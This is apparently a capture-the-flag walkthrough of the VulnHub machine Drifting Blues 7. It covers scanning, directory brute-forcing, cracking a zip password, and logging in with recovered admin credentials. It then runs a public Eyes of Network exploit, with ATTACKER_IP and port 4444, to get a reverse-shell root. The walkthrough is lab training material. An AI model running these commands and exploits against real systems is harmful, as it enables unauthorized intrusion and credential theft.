# 🔐 Drifting Blues 7  Walkthrough



---

## 📌 Overview
- **Machine:** Drifting Blues 7  
- **Platform:** VulnHub  
- **Objective:** Get root access

🎯 This walkthrough demonstrates a structured approach covering **enumeration, exploitation, and privilege escalation**.

---

## 🧠 Methodology

```mermaid
flowchart LR
A[Recon] --> B[Enumeration]
B --> C[Exploitation]
C --> D[Privilege Escalation]
D --> E[Root/User Access]
```

---

## 🌐 Network Discovery
We will start with first discovering our victim IP address with the help of net discover tool.
- Command: sudo netdiscover -r <IP_RANGE>

<img width="850" height="379" alt="image" src="https://github.com/user-attachments/assets/ac63874c-bb04-4ea9-8461-f846939fcef5" />

- Target IP: 192.168.56.106

---

## 🔎 Port Scanning
Once we have found out the IP address now we will use nmap to scan all open ports and services running on this machine.
- Command: sudo nmap -Pn -sS <TARGET_IP>

<img width="846" height="302" alt="image" src="https://github.com/user-attachments/assets/d2b2b696-6829-48dc-ae8a-220615f6b8f4" />

| Port | Service       |
| ---- | ------------- |
| 22   | SSH           |
| 80   | HTTP          |
| 111  | rpcbind       |
| 443  | HTTPS         |
| 3306 | mysql         |
| 8086 | d-s-n         |

---

## 🧪 Enumeration
With help of nmap I found out that port 80 is open which is http so we can go and browse the webpage to see what more I can find.

<img width="848" height="379" alt="image" src="https://github.com/user-attachments/assets/f125c842-125f-4f0b-a2f7-e42518c6c2cd" />

-  Port 80: Eyes of Network admin login panel
-  Default Credentials failed\
  
---

## 📂 Directory Bruteforce
Now I will try to perfom directory bruteforcing with help of dirbuste tool to find any hidden files or directories which can contain some useful information.
- Command: dirb https://<TARGET_IP> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
- 
  <img width="820" height="417" alt="image" src="https://github.com/user-attachments/assets/c3f66dd4-0e5e-4e48-abf4-81ba780b5b5a" />
  
  **Findings**
  -  bash.history

I found that that bash.history file contain shell command of previous user so we will open with help of curl command in our attacker machine.
-  Command: curl http://<TARGET_IP>/.bash_history
  
  <img width="856" height="412" alt="image" src="https://github.com/user-attachments/assets/971fdd9e-ff50-4952-9546-c6e4fa88ddb3" />

  <img width="854" height="415" alt="image" src="https://github.com/user-attachments/assets/202d4b6e-2698-4ae5-8d50-2546bcc70eec" />

  After opening bash.history with curl I found out that there is flag.txt inside it which contain a flag.

  For further enumeration I used gobuster tool to find any more informations.
  - Command: gobuster dir -u https://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt

    <img width="564" height="47" alt="image" src="https://github.com/user-attachments/assets/c0bafb88-2322-4482-a4c1-9a652c9741b2" />

 - Findings
   - /eon

  I found out another directory which /eon so I will also open this file with help of curl
  
  ---
  
  ## 🔐 Exploitation

  <img width="835" height="166" alt="image" src="https://github.com/user-attachments/assets/ff08c7d1-1724-4832-8736-53102e01863b" />

  After opening /eon I found out that there is something which in encoded in base64 so now we will decode it with help of base64.guru.

  <img width="840" height="374" alt="image" src="https://github.com/user-attachments/assets/11e9f93b-b6a3-437a-b2c6-5fe4f97dea72" />

  I found that there is an zip file so I download it and try to extract it but while extracting it was asking an password so I use zip2john to enumerate the    password hash for application.zip

  **Password Cracking**
  - Command: zip2john application.zip > hash
    
    john hash --wordlist=/usr/share/wordlists/rockyou.txt

    <img width="848" height="48" alt="image" src="https://github.com/user-attachments/assets/aabe9aa0-e07c-4f12-ade2-442eee61be58" />

    After cracking I found the password is **killah**

    Now I will use this password to extract the file and see what it contains.

    After extracting I found out that it contains username and password.
    - **Username:** admin
    - **Password:** isitreal31_

    I will use this username and password on Eyes of Network admin panel which I found earlier.

    <img width="848" height="414" alt="image" src="https://github.com/user-attachments/assets/34975c72-906b-4875-92a2-31b9d029a2bd" />

    Successfully logged into Eyes of Network Dashboard.

    **REMOTE CODE EXECUTION**
    
    In exploit.db website there is already a remote code execution exploit for eyes of network is available so I will download that exploit and try to exploit here.
    
    <img width="847" height="388" alt="image" src="https://github.com/user-attachments/assets/7f149b3a-1220-497c-87c8-815cf956a167" />


    So now I copy this exploit as exploit.py and run a python code to exploit the machine.

    - Command:  cp /usr/share/exploitdb/exploits/php/webapps/48025.txt exploit.py

         python3 exploit.py https://<TARGET_IP> \
         -ip <ATTACKER_IP> \
         -port 4444 \
         -user admin \
         -password isitreal31__

<img width="842" height="189" alt="image" src="https://github.com/user-attachments/assets/bd697686-f505-4690-a082-458177746bd3" />


- Reverse shell obtained

  ---

  ## 🧑‍💻 Privilege Escalation

  I already have root access so now I will find a root flag to complete this walkthrough.

  - Command: cd /root
    
     cat flag.txt

    <img width="843" height="273" alt="image" src="https://github.com/user-attachments/assets/ae3c96a4-2252-4c95-84a1-c942e4b34ded" />

    So I have successfully exxploited and gain the root access and achieved my goal.

    ---

  ## ⚔️ MITRE ATT&CK Mapping

  | Phase                | Technique             |
  | -------------------- | --------------------- |
  | Reconnaissance       | Active Scanning       |
  | Initial Access       | Valid Accounts        |
  | Execution            | Command Injection     |
  | Credential Access    | Unsecured Credentials |
  | Privilege Escalation | Exploitation          |

---

## 🧠 Key Takeaways
- Deep enumeration is critical
- Hidden files can leak sensitive data\
- Weakly protected archives are exploitable
- Chaining vulnerabilities leads to full compromise

---

## 👨‍💻 Author
Jeet Bandhara







   






